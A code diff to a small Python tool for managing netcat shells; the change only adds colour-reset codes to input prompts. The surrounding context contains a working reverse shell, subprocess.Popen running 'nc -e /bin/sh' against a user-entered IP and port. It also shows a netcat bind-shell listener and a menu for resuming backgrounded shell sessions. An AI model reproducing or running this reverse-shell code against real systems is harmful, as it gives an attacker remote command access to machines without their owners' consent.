@@ -25,8 +25,8 @@ def reverse_shell():
     # Start a reverse shell by connecting to the target IP and port
     resume = True
     
-    target_ip = input(YELLOW + "\n[*] Enter target \n[!]IP: ")
-    target_port = input(YELLOW + "[!]Port: ")
+    target_ip = input(YELLOW + "\n[*] Enter target \n[!]IP: " + ENDC)
+    target_port = input(YELLOW + "[!]Port: " + ENDC)
 
     p = subprocess.Popen(["nc", "-e", "/bin/sh", target_ip, target_port])
     processes.append(p)
@@ -36,7 +36,7 @@ def bind_shell():
     # Start a bind shell by listening on a specific port
     resume = True
 
-    listen_port = input(YELLOW + "\n[*] Enter listening \n[!]Port: ")
+    listen_port = input(YELLOW + "\n[*] Enter listening \n[!]Port: " + ENDC)
 
     p = subprocess.Popen(["nc", "-l", "-v", "-p", listen_port])
     processes.append(p)
@@ -60,7 +60,7 @@ def list_sessions():
 def resume_session():
     # Resume background sessions
     list_sessions()
-    session_number = int(input(YELLOW + "\nEnter the session number you want to resume: "))
+    session_number = int(input(YELLOW + "\nEnter the session number you want to resume: " + ENDC))
     p = processes[session_number-1]
     p.send_signal(signal.SIGCONT)
     #subprocess.Popen(["fg", str(p.pid)])
@@ -87,7 +87,7 @@ def print_menu():
     #print("3. Background session")
     #print("3. List sessions")
     print(f"{OKCYAN}3. Resume session")
-    choice = input(f"{YELLOW}\n[*]Enter your choice: ")
+    choice = input(f"{YELLOW}\n[*]Enter your choice: " + ENDC)
 
     if choice == "1":
         reverse_shell()
